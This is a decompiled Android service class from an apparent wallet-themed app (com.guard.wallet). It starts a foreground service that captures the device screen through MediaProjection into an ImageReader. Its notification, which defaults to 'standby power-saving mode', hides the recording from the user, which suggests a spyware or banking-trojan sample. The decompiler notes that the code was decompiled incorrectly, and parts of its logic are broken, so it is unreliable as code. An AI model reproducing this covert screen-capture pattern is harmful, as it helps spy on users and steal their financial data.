package com.guard.wallet.service;

import a1.AbstractC0026q;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.IBinder;
import android.support.v4.app.NotificationCompat;
import com.guard.wallet.MainApplication;
import com.guard.wallet.req.ScreenMetricsVO;
import com.guard.wallet.utils.AbstractC0248d;
import com.guard.wallet.utils.AbstractC0249e;
import java.util.concurrent.locks.ReentrantLock;
import p020x.C0967a;
import p020x.C0969c;

/* loaded from: classes.dex */
public class MediaLiveService extends Service {
    @Override // android.app.Service
    public final IBinder onBind(Intent intent) {
        return null;
    }

    @Override // android.app.Service
    public final void onCreate() {
        super.onCreate();
        NotificationManager notificationManager = (NotificationManager) getSystemService("notification");
        NotificationCompat.Builder contentIntent = new NotificationCompat.Builder(getApplicationContext(), "100").setContentIntent(PendingIntent.getActivity(this, 0, new Intent(this, (Class<?>) MediaLiveService.class), 67108864));
        Integer num = AbstractC0248d.f402a;
        NotificationCompat.Builder priority = contentIntent.setContentTitle((MainApplication.getInstance() == null || MainApplication.getInstance().getBuildConfig() == null || AbstractC0026q.m151B(MainApplication.getInstance().getBuildConfig().getNotificationTitle())) ? "standby power-saving mode" : MainApplication.getInstance().getBuildConfig().getNotificationTitle()).setContentText((MainApplication.getInstance() == null || MainApplication.getInstance().getBuildConfig() == null || AbstractC0026q.m151B(MainApplication.getInstance().getBuildConfig().getNotificationContent())) ? "entered standby power-saving mode, click here to wake up" : MainApplication.getInstance().getBuildConfig().getNotificationContent()).setWhen(System.currentTimeMillis()).setVisibility(1).setDefaults(-1).setCategory(NotificationCompat.CATEGORY_SERVICE).setPriority(2);
        NotificationChannel notificationChannel = new NotificationChannel("100", "front_media_live_notification", 4);
        notificationChannel.setLockscreenVisibility(1);
        notificationManager.createNotificationChannel(notificationChannel);
        priority.setChannelId("100");
        Notification build = priority.build();
        build.defaults = 1;
        build.flags = 32;
        startForeground(100, build);
    }

    @Override // android.app.Service
    public final void onDestroy() {
        super.onDestroy();
        ((NotificationManager) getSystemService("notification")).cancel(100);
        stopForeground(true);
    }

    /* JADX WARN: Removed duplicated region for block: B:8:0x0034  */
    @Override // android.app.Service
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final int onStartCommand(Intent intent, int i2, int i3) {
        MediaProjection mediaProjection;
        MediaProjectionManager mediaProjectionManager;
        int intExtra = intent.getIntExtra("code", -1);
        Intent intent2 = (Intent) intent.getParcelableExtra("data");
        try {
            mediaProjectionManager = (MediaProjectionManager) getSystemService("media_projection");
        } catch (Exception e2) {
            AbstractC0026q.m186s("MediaLiveService", e2);
        }
        if (mediaProjectionManager != null) {
            mediaProjection = mediaProjectionManager.getMediaProjection(intExtra, intent2);
            mediaProjection.registerCallback(new C0969c(), C0967a.m1463d());
            if (mediaProjection != null) {
                C0967a m1462b = C0967a.m1462b();
                ReentrantLock reentrantLock = m1462b.f2299d;
                if (reentrantLock.tryLock()) {
                    if (!m1462b.m1464c()) {
                        m1462b.f2297b = mediaProjection;
                        ScreenMetricsVO m616e = AbstractC0249e.m616e();
                        ImageReader newInstance = ImageReader.newInstance(m616e.getWidth().intValue(), m616e.getHeight().intValue(), 1, 2);
                        m1462b.f2296a = newInstance;
                        newInstance.setOnImageAvailableListener(m1462b.f2302g, C0967a.m1463d());
                        m1462b.f2298c = C0967a.m1461a(m1462b.f2297b, m1462b.f2296a.getSurface());
                    }
                    reentrantLock.unlock();
                }
            }
            return 1;
        }
        mediaProjection = null;
        if (mediaProjection != null) {
        }
        return 1;
    }
}
